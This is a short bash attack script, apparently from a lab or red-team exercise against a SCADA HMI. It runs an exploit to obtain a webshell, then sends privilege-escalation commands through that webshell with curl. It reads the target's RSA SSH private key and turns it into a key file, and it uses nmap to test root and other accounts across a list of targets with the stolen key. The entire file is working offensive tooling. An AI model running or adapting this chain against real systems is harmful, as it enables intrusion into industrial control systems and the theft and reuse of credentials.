#!/bin/bash
. config

echo "${red}Exploit the targets...${reset}"
WEBSHELL=$(python3 ${LINSCADA_EXPLOIT} ${HMI_IP} ${EXPLOIT_PORT} ${EXPLOIT_USER} ${EXPLOIT_PASS} 2>&1 >/dev/null )

echo "${red}Searching for interesting files...${reset}"
cat ${PWN_PATH}/priv-esc.txt | xargs -P4 -I{} -n1 curl -G $WEBSHELL --data-urlencode "cmd={}" # | xargs | egrep -o "<pre>.*?</pre>" (greep the content between <pre> tags)
echo "${red}Let's escalate the privileges...${reset}"
curl -G $WEBSHELL --data-urlencode "cmd=cat $RSA_SSH_KEY_LOCATION" | tee rsa.html
python3 rsa-e.py > hmi-ssh.key
chmod 0600 hmi-ssh.key
nmap -p 22 --script ssh-publickey-acceptance --script-args "ssh.usernames={'root', 'user', 'admin', 'manager', 'apdias'}, ssh.privatekeys={'hmi-ssh.key'}" -iL ip-targets.txt

